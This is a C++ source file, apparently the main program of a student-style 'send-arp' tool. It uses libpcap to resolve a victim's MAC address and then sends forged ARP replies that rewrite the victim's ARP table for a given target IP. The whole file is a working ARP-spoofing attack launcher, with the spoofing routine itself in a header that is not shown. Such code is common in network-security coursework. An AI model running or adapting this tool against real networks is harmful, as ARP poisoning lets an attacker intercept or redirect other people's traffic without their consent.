#include <iostream>
#include <csignal>
#include <pcap.h>

#include "send-arp.hpp"

using namespace std;

pcap_t* pcap;

/*
 * Keyboard interrupt handler
*/
void InterruptHandler(const int signo) {
    if(signo == SIGINT) {
        cout << "\nKeyboard Interrupt" << endl;
        if(pcap != NULL) pcap_close(pcap);
        exit(0);

    }
    else if(signo == SIGTERM) {
        cout << "\nTermination request sent to the program" << endl;
        if(pcap != NULL) pcap_close(pcap);
        exit(0);
    }
}

int main(int argc, char* argv[]) {
    signal(SIGINT, InterruptHandler);
    signal(SIGTERM, InterruptHandler);

    if(argc < 4 or argc bitand 1) {
        cerr << "Error: Wrong parameters are given\n";
        cerr << "syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n";
        cerr << "sample : send-arp wlan0 192.168.10.2 192.168.10.1" << endl;

        return 1;
    }

    char* dev;
	char errbuf[PCAP_ERRBUF_SIZE];
    Mac myMAC, sendMAC, targetMAC;
    Ip myIP, sendIP, targetIP;
	int i;


    dev = argv[1];
    pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if(pcap == NULL) {
        cerr << "Error: Error while open device " << dev << '\n';
        cerr << errbuf << endl;

        return 1;
    }

#ifdef DEBUG
    cout << "[DEBUG] Completely open pcap\n";
#endif

    // get local information
    if(not getMyInfo(dev, myMAC, myIP)) return 1;

#ifdef DEBUG
    cout << "[DEBUG] Completely get local information\n";
    cout << "[DEBUG] MyMAC : " << string(myMAC) << '\n';
    cout << "[DEBUG] MyIP  : " << string(myIP) << '\n';
#endif

    // send ARP packet at each sender, target
    for(i = 1; i < (argc >> 1); i++) {

#ifdef DEBUG
        cout << "[DEBUG] sendIP   : " << argv[i << 1] << '\n';
        cout << "[DEBUG] targetIP : " << argv[(i << 1) + 1] << '\n';
#endif
        
        sendIP = Ip(argv[i << 1]);
        targetIP = Ip(argv[(i << 1) + 1]);

        if(not getMACByIP(pcap, sendMAC, sendIP, myMAC, myIP)) return 1;

#ifdef DEBUG
        cout << "[DEBUG] Completely get MAC by IP\n";
        cout << "[DEBUG] sendMAC : " << string(sendMAC) << '\n';
#endif
        // print information to chect each addresses
        printInfo(myMAC, myIP, sendMAC, sendIP, targetIP);

        if(not attackARP(pcap, sendMAC, sendIP, myMAC, targetIP)) return 1;

#ifdef DEBUG
        cout << "[DEBUG] Completely send ARP packet\n";
#endif

        cout << "Successfully change sender(" << argv[i << 1] << ")'s ARP table\n";
    }

    pcap_close(pcap);
}